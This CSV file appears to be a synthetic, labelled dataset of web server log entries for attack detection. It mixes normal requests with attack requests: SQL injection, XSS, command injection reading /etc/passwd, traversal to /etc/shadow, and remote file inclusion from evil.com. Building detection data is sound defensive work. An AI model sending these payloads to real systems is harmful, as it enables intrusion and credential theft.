timestamp,ip,method,url,status_code,user_agent,is_attack,attack_type
2025-04-30 07:57:22,192.168.0.168,GET,/dashboard,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.81,GET,/view?include=../../../../etc/passwd,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.206,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.20,GET,/login?user=admin'--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.210,GET,/dashboard,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.201,POST,/search?q=<script>alert('x')</script>,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.106,POST,/search?q=<script>alert('x')</script>,500,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.178,GET,/img/logo.png,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.225,POST,/cmd?exec=cat%20/etc/passwd,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.21,POST,/index.html,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.111,POST,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.195,POST,/vendor/bootstrap.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.210,GET,/search?q=1' UNION SELECT null--,403,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.132,POST,/favicon.ico,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.102,POST,/dashboard,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.185,GET,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.229,GET,/,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.162,GET,/favicon.ico,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.85,POST,/css/style.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.129,GET,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.234,GET,/cmd?exec=cat%20/etc/passwd,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.250,POST,/css/style.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.143,GET,/search?q=1' UNION SELECT null--,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.8,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.200,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.187,POST,/product?id=10 OR 1=1,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.181,GET,/search?q=<script>alert('x')</script>,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.104,POST,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.141,GET,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.71,POST,/ping?ip=127.0.0.1;ls,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.62,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.152,POST,/,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.148,POST,/ping?ip=127.0.0.1;ls,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.198,POST,/vendor/bootstrap.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.250,POST,/contact,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.93,POST,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.142,GET,/img/logo.png,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.37,POST,/js/app.js,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.171,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.56,GET,/product?id=10 OR 1=1,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.238,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.15,POST,/js/app.js,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.68,POST,/cmd?exec=cat%20/etc/passwd,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.180,GET,/profile,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.211,GET,/search?q=1' UNION SELECT null--,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.224,GET,/view?include=../../../../etc/passwd,200,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.55,POST,/favicon.ico,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.100,POST,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.65,GET,/profile,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.147,POST,/page?file=http://evil.com/shell.txt,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.159,POST,/about,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.215,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.70,POST,/dashboard,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.92,GET,/dashboard,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.233,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.84,POST,/about,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.68,POST,/view?include=../../../../etc/passwd,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.126,POST,/search?q=1' UNION SELECT null--,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.205,GET,/index.html,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.14,POST,/profile,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.31,POST,/page?file=http://evil.com/shell.txt,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.90,GET,/product?id=10 OR 1=1,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.157,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.109,GET,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.71,POST,/download?file=../../../../etc/passwd,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.165,GET,/about,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.161,GET,/view?include=../../../../etc/passwd,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.48,GET,/cmd?exec=cat%20/etc/passwd,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.174,POST,/favicon.ico,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.220,POST,/product?id=10 OR 1=1,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.21,POST,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.228,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.20,POST,/profile,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.120,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.15,GET,/dashboard,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.181,GET,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.195,POST,/favicon.ico,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.66,POST,/profile,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.148,GET,/css/style.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.34,POST,/index.html,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.48,POST,/css/style.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.108,POST,/index.html,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.20,POST,/page?file=http://evil.com/shell.txt,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.220,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.23,POST,/view?include=../../../../etc/passwd,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.168,POST,/index.html,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.62,POST,/dashboard,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.45,GET,/page?file=http://evil.com/shell.txt,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.3,GET,/css/style.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.68,GET,/favicon.ico,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.52,GET,/search?q=1' UNION SELECT null--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.169,GET,/dashboard,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.16,GET,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.144,GET,/view?include=../../../../etc/passwd,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.191,POST,/cmd?exec=cat%20/etc/passwd,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.114,GET,/download?file=../../../../etc/passwd,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.166,POST,/cmd?exec=cat%20/etc/passwd,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.95,POST,/search?q=1' UNION SELECT null--,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.43,GET,/index.html,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.250,GET,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.89,GET,/page?file=http://evil.com/shell.txt,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.169,GET,/css/style.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.40,GET,/profile,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.54,POST,/vendor/bootstrap.css,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.2,GET,/contact,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.147,POST,/dashboard,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.58,POST,/css/style.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.14,POST,/index.html,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.69,GET,/dashboard,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.33,POST,/img/logo.png,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.114,GET,/index.html,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.89,POST,/vendor/bootstrap.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.45,POST,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.228,GET,/contact,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.162,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.17,POST,/dashboard,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.237,POST,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.192,GET,/login?user=admin'--,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.136,POST,/css/style.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.108,POST,/cmd?exec=cat%20/etc/passwd,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.127,POST,/css/style.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.179,GET,/login?user=admin'--,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.127,POST,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.234,POST,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.32,POST,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.152,GET,/product?id=10 OR 1=1,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.36,POST,/contact,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.8,POST,/ping?ip=127.0.0.1;ls,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.154,GET,/profile,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.168,GET,/,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.243,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.88,GET,/search?q=1' UNION SELECT null--,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.47,POST,/ping?ip=127.0.0.1;ls,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.36,GET,/product?id=10 OR 1=1,403,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.29,GET,/search?q=1' UNION SELECT null--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.185,POST,/view?include=../../../../etc/passwd,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.112,GET,/login?user=admin'--,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.91,POST,/ping?ip=127.0.0.1;ls,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.152,GET,/index.html,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.68,POST,/favicon.ico,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.107,GET,/css/style.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.174,GET,/profile,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.172,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.78,GET,/about,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.162,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.68,GET,/contact,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.88,GET,/profile,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.227,POST,/download?file=../../../../etc/passwd,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.181,GET,/view?include=../../../../etc/passwd,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.187,POST,/page?file=http://evil.com/shell.txt,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.68,GET,/dashboard,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.224,GET,/view?include=../../../../etc/passwd,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.144,POST,/cmd?exec=cat%20/etc/passwd,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.26,POST,/ping?ip=127.0.0.1;ls,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.40,POST,/ping?ip=127.0.0.1;ls,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.191,POST,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.199,POST,/vendor/bootstrap.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.23,GET,/search?q=<script>alert('x')</script>,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.53,POST,/contact,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.87,POST,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.218,GET,/page?file=http://evil.com/shell.txt,200,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.115,POST,/view?include=../../../../etc/passwd,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.181,GET,/download?file=../../../../etc/passwd,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.223,GET,/index.html,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.98,GET,/css/style.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.233,GET,/search?q=1' UNION SELECT null--,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.6,POST,/product?id=10 OR 1=1,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.79,POST,/dashboard,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.241,GET,/page?file=http://evil.com/shell.txt,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.106,POST,/page?file=http://evil.com/shell.txt,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.52,POST,/,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.255,GET,/search?q=<script>alert('x')</script>,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.91,GET,/search?q=<script>alert('x')</script>,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.75,GET,/search?q=1' UNION SELECT null--,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.44,GET,/ping?ip=127.0.0.1;ls,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.235,GET,/product?id=10 OR 1=1,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.71,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.83,POST,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.170,POST,/css/style.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.38,POST,/about,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.110,POST,/contact,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.215,GET,/vendor/bootstrap.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.159,POST,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.153,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.91,POST,/search?q=<script>alert('x')</script>,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.119,POST,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.84,POST,/js/app.js,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.8,GET,/contact,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.129,POST,/search?q=1' UNION SELECT null--,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.181,GET,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.228,POST,/vendor/bootstrap.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.47,GET,/login?user=admin'--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.124,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.7,GET,/login?user=admin'--,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.101,POST,/product?id=10 OR 1=1,403,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.172,POST,/,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.243,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.26,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.171,GET,/dashboard,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.196,POST,/login?user=admin'--,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.175,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.92,GET,/page?file=http://evil.com/shell.txt,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.38,GET,/index.html,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.253,GET,/img/logo.png,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.199,GET,/product?id=10 OR 1=1,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.178,POST,/img/logo.png,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.39,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.124,GET,/js/app.js,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.72,GET,/cmd?exec=cat%20/etc/passwd,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.205,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.111,GET,/search?q=<script>alert('x')</script>,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.21,GET,/search?q=1' UNION SELECT null--,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.88,GET,/about,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.55,POST,/js/app.js,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.220,POST,/vendor/bootstrap.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.175,POST,/index.html,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.238,POST,/favicon.ico,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.127,GET,/cmd?exec=cat%20/etc/passwd,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.217,GET,/index.html,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.233,GET,/img/logo.png,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.28,GET,/login?user=admin'--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.81,GET,/view?include=../../../../etc/passwd,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.121,POST,/page?file=http://evil.com/shell.txt,500,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.236,POST,/img/logo.png,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.164,GET,/dashboard,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.127,POST,/contact,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.43,POST,/favicon.ico,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.23,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.253,GET,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.168,GET,/vendor/bootstrap.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.121,POST,/favicon.ico,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.161,POST,/cmd?exec=cat%20/etc/passwd,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.204,GET,/cmd?exec=cat%20/etc/passwd,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.216,POST,/search?q=1' UNION SELECT null--,403,python-requests/2.25,True,sql_injection
